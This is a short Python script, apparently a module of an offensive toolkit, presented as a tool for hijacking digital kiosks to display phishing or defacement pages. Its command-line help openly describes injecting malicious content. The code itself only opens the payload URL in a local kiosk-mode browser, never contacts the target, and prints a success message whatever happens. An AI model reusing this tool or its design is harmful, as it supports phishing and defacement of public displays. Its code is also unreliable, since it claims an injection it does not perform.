#!/usr/bin/env python3
# modules/attacks/digital_kiosk_hijacker.py

import argparse
import os
import json
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

LOG_FILE = "results/kiosk_hijack_log.json"
MITRE_TTP = "T1491.002"

def log_event(target, payload_url):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target": target,
            "url_injected": payload_url,
            "ttp": MITRE_TTP
        }) + "\n")

def inject_kiosk_payload(kiosk_url, payload_url):
    chrome_options = Options()
    chrome_options.add_argument("--kiosk")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-gpu")

    try:
        driver = webdriver.Chrome(options=chrome_options)
        driver.get(payload_url)
        log_event(kiosk_url, payload_url)
        print(f"[✓] Injected payload into kiosk session")
        time.sleep(10)  # Let it display
        driver.quit()
    except Exception as e:
        print(f"[!] Failed to control kiosk: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject malicious content into digital kiosks using browser hijack")
    parser.add_argument("--target", required=True, help="Kiosk IP or URL")
    parser.add_argument("--payload", required=True, help="URL to inject (e.g., phishing page)")
    args = parser.parse_args()

    inject_kiosk_payload(args.target, args.payload)
